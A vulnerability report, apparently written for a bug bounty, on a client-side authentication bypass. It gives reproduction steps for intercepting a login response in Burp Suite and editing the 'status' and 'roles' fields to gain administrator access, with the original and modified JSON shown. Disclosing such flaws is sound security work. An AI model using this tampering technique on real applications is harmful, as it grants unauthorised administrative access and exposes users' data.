# Client-Side Authentication Bypass via Modified Login Response

## Severity
High (P2)

## Vulnerability Type
Broken Authentication / Authentication Bypass

## Description
The application fully trusts authentication status and role information provided by the client.

By intercepting and modifying the login API response, an attacker can manipulate the authentication status and assigned roles, resulting in **full administrative access without valid credentials**.

This vulnerability allows **unauthenticated attackers** to gain privileged access by tampering with client-side controlled values.

---

## Affected Component
Authentication API response handling

---

## Steps to Reproduce

1. Navigate to the application login page { https://example.com/login }

2. Enter any **invalid credentials** (e.g. `admin / admin`)

3. Intercept the login response using **Burp Suite**

4. Observe the original server response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
"fullName": "REDACTED",
"status": false,
"errorType": "No Roles on this application",
"errorMessage": "You do not have access to this application.",
"userId": "REDACTED",
"roles": ""
}
``` 
5. Modify the response to:
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "fullName": "REDACTED",
  "status": true,
  "errorType": "No Roles on this application",
  "errorMessage": "You do not have access to this application.",
  "userId": "REDACTED",
  "roles": "admin"
}
```
6. Forward the modified response to the browser
7. The application grants full administrative access without validating credentials

## Proof of Concept (PoC)
Authentication and authorization decisions are performed entirely on client-controlled data.
By modifying the login response parameters (status and roles), an attacker can gain administrative access without valid credentials.

## Impact

- An unauthenticated attacker can:

- Bypass authentication completely

- Log in as any user role, including Administrator

- Gain full administrative access without credentials

- Perform privileged administrative actions

- Fully compromise the application and its data
